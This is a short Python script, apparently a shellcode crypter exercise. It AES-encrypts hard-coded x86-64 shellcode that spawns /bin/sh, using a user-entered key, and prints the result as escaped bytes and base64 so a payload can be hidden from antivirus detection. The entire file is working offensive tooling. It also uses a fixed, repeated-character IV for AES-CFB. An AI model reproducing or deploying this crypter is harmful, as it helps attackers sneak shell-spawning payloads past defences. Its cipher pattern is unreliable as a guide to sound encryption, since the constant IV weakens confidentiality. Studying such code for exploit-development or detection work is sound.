import base64
import hashlib
from Crypto.Cipher import AES
class AESCipher(object):

    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = 'a'*AES.block_size
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]



shellcode="\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

main_key=raw_input("Enter the key:")
print ("key:"+main_key)
crypter_class=AESCipher(main_key)
encrypted=crypter_class.encrypt(shellcode)
print ("Encrypted")
encode=""
encode2=""
for x in bytearray(encrypted):
        encode+="\\x"
        encode+="%02x"%x
        encode2+="0x"
        encode2+="%02x,"%x
print (encode)
temp1=base64.b64encode(encrypted)
print (temp1)
